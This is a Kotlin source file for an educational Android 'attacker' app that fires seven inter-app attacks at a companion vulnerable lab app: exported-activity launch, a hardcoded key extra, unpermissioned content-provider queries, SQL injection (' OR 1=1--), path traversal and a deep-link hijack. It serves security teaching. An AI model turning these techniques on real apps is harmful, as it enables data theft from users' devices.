package com.siegeraider

import android.app.Activity
import android.content.ActivityNotFoundException
import android.content.Context
import android.content.Intent
import android.database.Cursor
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.runBlocking

/**
 * SiegeRaider — the educational attacker app. Fires real inter-app attacks at the
 * SiegeApp lab installed on this device and reports what came back. When SiegeApp
 * runs in insecure mode the attacks capture their targets; flip SiegeApp's
 * Secure/Insecure toggle and the same attacks are refused ("target hardened").
 */
class RaiderActivity : Activity() {
    private val target = "com.droidsiege"
    private lateinit var log: TextView

    private fun line(v: String, size: Float, color: Int, mono: Boolean = false): TextView =
        TextView(this).apply {
            text = v
            textSize = size
            setTextColor(color)
            setPadding(0, 12, 0, 12)
            if (mono) typeface = android.graphics.Typeface.MONOSPACE
        }

    private fun card(title: String, blurb: String, run: (Context) -> String): LinearLayout =
        LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.rgb(15, 23, 42))
            setPadding(32, 24, 32, 24)
            addView(line(title, 17f, Color.WHITE))
            addView(line(blurb, 13f, Color.rgb(148, 163, 184)))
            val button = TextView(this@RaiderActivity).apply {
                text = "▶  FIRE"
                textSize = 15f
                setTextColor(Color.rgb(96, 165, 250))
                setPadding(0, 16, 0, 0)
            }
            button.setOnClickListener {
                it.isEnabled = false
                kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                    val result = try {
                        run(applicationContext)
                    } catch (boom: Exception) {
                        "FAILED: ${boom.javaClass.simpleName}: ${boom.message}"
                    }
                    Handler(Looper.getMainLooper()).post {
                        appendLog("$title\n$result")
                        it.isEnabled = true
                    }
                }
            }
            addView(button)
        }

    private fun appendLog(entry: String) {
        val stamp = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
        val sep = System.lineSeparator() + System.lineSeparator()
        val history = log.text.toString().substringAfter(sep, "")
        log.text = ("-- last result " + stamp + " --" + System.lineSeparator() + entry +
            if (history.isEmpty()) "" else sep + history)
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val pad = (16 * resources.displayMetrics.density).toInt()
        val root = ScrollView(this).apply {
            setBackgroundColor(Color.rgb(2, 6, 23))
        }
        val col = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(pad, pad, pad, pad)
        }
        col.addView(line("SiegeRaider", 26f, Color.WHITE))
        col.addView(
            line(
                "Educational attacker app — targets ONLY the SiegeApp lab on this device.\n" +
                    "Insecure SiegeApp: attacks capture. Secure SiegeApp: refused.",
                13f,
                Color.rgb(250, 204, 21),
            ),
        )

        val installed = try {
            packageManager.getPackageInfo(target, 0)
            true
        } catch (e: Exception) {
            false
        }
        col.addView(
            line(
                if (installed) "target: com.droidsiege ✓ installed" else "target com.droidsiege NOT installed — install the lab first",
                13f,
                if (installed) Color.rgb(74, 222, 128) else Color.rgb(248, 113, 113),
                mono = true,
            ),
        )

        log = TextView(this).apply {
            textSize = 13f
            typeface = android.graphics.Typeface.MONOSPACE
            setTextColor(Color.rgb(203, 213, 225))
            setPadding(0, pad, 0, pad)
        }

        col.addView(card(
            "1 · Exported activity",
            "Launches the recovery portal with no permission gate.",
        ) { ctx ->
            ctx.startActivity(
                Intent().setClassName(target, "$target.challenges.components.ExportFlagActivity")
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
            )
            "launched — SiegeApp now shows the recovery portal on top. Read what it renders."
        })

        col.addView(card(
            "2 · Keyed exported activity",
            "Launches with the master_key extra (a jadx-readable constant).",
        ) { ctx ->
            ctx.startActivity(
                Intent().setClassName(target, "$target.challenges.components.KeyedExportActivity")
                    .putExtra("master_key", "siege-master-key-2026")
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
            )
            "launched with the key — check the rendered vault code."
        })

        col.addView(card(
            "3 · Provider query (no read permission)",
            "content://com.droidsiege.vault/secrets — the whole secrets table.",
        ) { ctx ->
            val c: Cursor? = ctx.contentResolver.query(
                Uri.parse("content://com.droidsiege.vault/secrets"), null, null, null, null,
            )
            c.use {
                buildString {
                    while (it != null && it.moveToNext()) {
                        append("${it.getString(0)} = ${it.getString(1)}\n")
                    }
                }.ifEmpty { "(no rows)"
                }
            }
        })

        col.addView(card(
            "4 · Provider SQL injection",
            "lookup?filter=' OR 1=1-- — dumps the hidden table.",
        ) { ctx ->
            val c: Cursor? = ctx.contentResolver.query(
                Uri.parse("content://com.droidsiege.vault/lookup?filter=" +
                    Uri.encode("' OR 1=1--")), null, null, null, null,
            )
            c.use {
                buildString {
                    while (it != null && it.moveToNext()) {
                        append("${it.getString(0)} = ${it.getString(1)}\n")
                    }
                }.ifEmpty { "(no rows — hardened path uses parameterized queries)" }
            }
        })

        col.addView(card(
            "5 · Provider path traversal",
            "openFile with ../.. escaping the provider root.",
        ) { ctx ->
            val pfd = ctx.contentResolver.openFileDescriptor(
                Uri.parse("content://com.droidsiege.vault/../../secret_flag.txt"), "r",
            )
            pfd.use {
                if (it == null) return@use "(provider refused the descriptor)"
                val bytes = ByteArray(128)
                val n = java.io.FileInputStream(it.fileDescriptor).read(bytes)
                String(bytes, 0, maxOf(n, 0))
            }
        })

        col.addView(card(
            "6 · Exported receiver broadcast",
            "Fires com.droidsiege.CHAIN_ARM at the exported receiver.",
        ) { ctx ->
            ctx.sendBroadcast(
                Intent("com.droidsiege.CHAIN_ARM").putExtra("sender_id", "raider"),
            )
            "broadcast delivered — check SiegeApp's components screen for the receiver verdict."
        })

        col.addView(card(
            "7 · Deep link hijack",
            "droidsiege://recover — the recovery screen answers attacker input.",
        ) { ctx ->
            ctx.startActivity(
                Intent(Intent.ACTION_VIEW, Uri.parse("droidsiege://recover?code=raider"))
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
            )
            "deep link fired — the recovery screen opened on the link's terms."
        })

        root.addView(col)
        root.addView(log)
        setContentView(root)
    }
}
